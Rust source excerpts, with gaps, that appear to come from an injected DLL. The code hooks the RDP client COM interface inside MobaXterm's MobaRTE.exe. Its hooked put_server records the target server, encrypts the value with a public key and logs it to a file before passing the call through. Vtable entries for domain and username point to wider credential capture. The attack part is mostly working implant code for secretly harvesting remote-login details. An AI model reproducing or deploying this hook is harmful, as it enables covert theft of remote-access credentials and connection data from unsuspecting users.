...
fn get_msrdpclient() -> Result<IMsRdpClient9, windows::core::Error> {
    let CLSID_MsRdpClient9NotSafeForScripting: GUID =
        GUID::from_u128(0x8B918B82_7985_4C24_89DF_C33AD2BBFBCD);

    let res: IMsRdpClient9 = unsafe {
        CoCreateInstance(
...
extern "stdcall" fn put_server(this: *mut c_void, server: BSTR) -> HRESULT {
    let server_data: Vec<u16> = format!(
        "[Mobaxterm] Server : {}",
    ...
    let _ = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &server_data, PUBLIC_KEY);
    #[cfg(debug_assertions)]
    let result = encrypt_and_log_data_to_file(OUTPUT_PATH.to_string(), &server_data, PUBLIC_KEY);
    ...
    type FnPutServer = extern "stdcall" fn(*mut c_void, BSTR) -> HRESULT;
    let original_func: FnPutServer = unsafe { transmute(ORIGINAL_PUT_SERVER) };
        ...
        DLL_PROCESS_ATTACH => {
            START.call_once(|| {
                if let Ok(exe_name) = current_exe() {
                    if exe_name.ends_with("MobaRTE.exe") {
                        let result = hook_com_methods();
                        #[cfg(debug_assertions)]
                        {
                            if result.is_err() {
                                log_data(format!("Failed hooking COM methods for MobaRTE\n"));
                            }
                        }
                    }
                }
...
struct IMsRdpClient9(IUnknown);

#[repr(C)]
#[allow(non_snake_case, non_camel_case_types)]
pub(crate) struct IMsRdpClient9_Vtbl {
    pub base__: IUnknown_Vtbl,
    padding1: [usize; 4],
    pub put_Server: unsafe extern "stdcall" fn(this: *mut IMsRdpClient9, server: BSTR) -> HRESULT,
    padding2: [usize; 1],
    pub put_Domain: unsafe extern "stdcall" fn(this: *mut IMsRdpClient9, domain: BSTR) -> HRESULT,
    padding3: [usize; 1],
    pub put_UserName:
        unsafe extern "stdcall" fn(this: *mut IMsRdpClient9, username: BSTR) -> HRESULT,
    padding4: [usize; 41],
...
unsafe impl Interface for IMsRdpClient9 {
    type Vtable = IMsRdpClient9_Vtbl;
}

unsafe impl ComInterface for IMsRdpClient9 {
    const IID: windows::core::GUID =
        windows::core::GUID::from_u128(0x28904001_04B6_436C_A55B_0AF1A0883DC9);
}
